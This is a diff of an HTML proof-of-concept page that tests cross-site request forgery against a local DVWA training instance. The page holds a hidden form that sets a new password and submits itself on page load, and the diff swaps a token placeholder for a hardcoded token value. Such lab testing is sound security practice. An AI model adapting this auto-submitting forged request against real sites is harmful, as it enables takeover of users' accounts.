@@ -1,21 +1,24 @@
 <!doctype html>
 <html lang="en">
+
 <head>
   <meta charset="utf-8">
   <title>DVWA CSRF High-Level Manual Token Test</title>
 </head>
+
 <body>
-  <p>Set HIGH_TOKEN below with a valid user_token from your active DVWA session.</p>
+  <p>Replace user_token value with actual anti-CSRF token</p>
 
   <form id="csrfForm" action="http://localhost:4280/vulnerabilities/csrf/" method="GET">
     <input type="hidden" name="password_new" value="HighManual123!">
     <input type="hidden" name="password_conf" value="HighManual123!">
     <input type="hidden" name="Change" value="Change">
-    <input type="hidden" name="user_token" value="HIGH_TOKEN">
+    <input type="hidden" name="user_token" value="6ff0eed512918786268588037488ad31">
   </form>
 
   <script>
     document.getElementById("csrfForm").submit();
   </script>
 </body>
+
 </html>
